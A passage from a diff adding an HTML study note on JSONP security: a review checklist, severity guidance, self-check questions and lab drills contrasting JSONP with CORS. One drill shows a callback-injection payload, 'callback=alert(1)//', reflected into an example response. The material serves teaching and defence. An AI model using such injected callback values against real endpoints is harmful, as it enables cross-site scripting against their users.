+      <li>Are cookies, bearer tokens, API keys, client certificates, or session-bound state involved?</li>
+      <li>Can an arbitrary external site include the endpoint as a script?</li>
+      <li>Does the callback parameter accept anything besides a conservative identifier path?</li>
+      <li>Does the response change behavior based on <code>callback</code>, <code>format</code>, <code>output</code>, or content negotiation?</li>
+      <li>Are caches separating JSONP responses by callback and authorization state?</li>
+      <li>Is there a migration path to CORS JSON, or is JSONP still part of the public contract?</li>
+    </ol>
+  </div>
+
+  <div class="callout brain">
+    <span class="ct">Severity shortcut</span>
+    <p>Unauthenticated public weather data via JSONP is technical debt. Authenticated account data via JSONP is a confidentiality vulnerability. Callback injection that executes arbitrary script is XSS. A third-party JSONP provider loaded into a sensitive app is supply-chain script risk.</p>
+  </div>
+</section>
+
+<section class="mod" id="m12">
+  <div class="modhead"><span class="modnum">12</span><h2>Self-check</h2></div>
+
+  <h3>Defense questions</h3>
+
+  <details>
+    <summary>In one sentence, why did JSONP come into existence?</summary>
+    <p>Because early web applications needed cross-origin data reads before CORS was widely available, and cross-origin script inclusion was already permitted by browsers.</p>
+  </details>
+
+  <details>
+    <summary>What is the single most important technical distinction between JSON and JSONP?</summary>
+    <p>JSON is inert data that must be parsed; JSONP is JavaScript source that the browser executes, usually as a function call containing a JSON-shaped argument.</p>
+  </details>
+
+  <details>
+    <summary>Why is callback validation not enough to protect authenticated JSONP?</summary>
+    <p>Callback validation can prevent some reflected-script attacks, but it does not stop an attacker page from defining a valid callback name and receiving private data from a victim-authenticated response.</p>
+  </details>
+
+  <details>
+    <summary>How is JSONP data theft similar to and different from CSRF?</summary>
+    <p>Both abuse the victim browser's ability to send authenticated cross-site requests. CSRF usually focuses on causing an action; JSONP data theft focuses on reading a response that the server intentionally emits as executable callback code.</p>
+  </details>
+
+  <details>
+    <summary>Why does CORS provide a better model?</summary>
+    <p>CORS lets the resource owner decide which origins may read a response while preserving the response as data. JSONP uses script execution as the transfer mechanism, so the browser's data-exposure controls are bypassed by design.</p>
+  </details>
+
+  <details>
+    <summary>When, if ever, is JSONP tolerable?</summary>
+    <p>Only as a legacy compatibility mechanism for strictly public, non-sensitive, read-only data where the provider accepts that the response is executable script. For new systems, use CORS JSON instead.</p>
+  </details>
+
+  <h3>Lab prompts</h3>
+  <p>Use these as oral-defense drills. The point is not to memorize the code; it is to explain which security boundary failed.</p>
+
+<pre><code><span class="c">1. Identify the vulnerability.</span>
+https://api.example/me?callback=show
+<span class="g">Response:</span> show({<span class="y">"email"</span>:<span class="y">"user@example.com"</span>,<span class="y">"mfa"</span>:true});
+
+<span class="c">2. Classify the bug.</span>
+https://api.example/feed?callback=alert(1)//
+<span class="g">Response:</span> alert(1)//({<span class="y">"items"</span>:[]});
+
+<span class="c">3. Explain why this is not JSONP.</span>
+HTTP/1.1 200 OK
+Content-Type: application/json
+Access-Control-Allow-Origin: https://app.example
+
+{<span class="y">"items"</span>:[]}
+
+<span class="c">4. Give the migration target.</span>
+$.ajax({ url: <span class="y">"https://api.example/feed?callback=?"</span>, dataType: <span class="y">"jsonp"</span> });</code></pre>
+</section>
+
+<div class="colophon">
+  <h3>Colophon &amp; provenance</h3>
+  <p>Built as a standalone HTML study note using the visual structure of the supplied course template: masthead, thesis card, modules, mechanism blocks, callouts, tables, code traces, and collapsible self-checks.</p>
+  <p>Primary background: RFC 6454, <a href="https://datatracker.ietf.org/doc/rfc6454/">The Web Origin Concept</a>; MDN, <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy">Same-origin policy</a>; W3C, <a href="https://www.w3.org/TR/2020/SPSD-cors-20200602/">Cross-Origin Resource Sharing</a>, especially its security discussion contrasting CORS with JSONP-style code injection; OWASP WSTG, <a href="https://owasp.github.io/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion">Testing for Cross Site Script Inclusion</a>; Mozilla Security Blog, <a href="https://blog.mozilla.org/security/2012/02/10/using-json-for-private-data/">Using JSON for Private Data</a>; MITRE CAPEC-111, <a href="https://capec.mitre.org/data/definitions/111.html">JSON Hijacking</a>.</p>
+  <p>Historical note: the JSONP pattern is generally associated with the 2005 "JSON with Padding" proposal attributed to Bob Ippolito. The exact practical risk of old JSON hijacking variants depends on browser generation, but the broader rule remains current: do not expose private data as executable cross-origin script.</p>
+</div>
+
+</div>
+</body>
+</html>
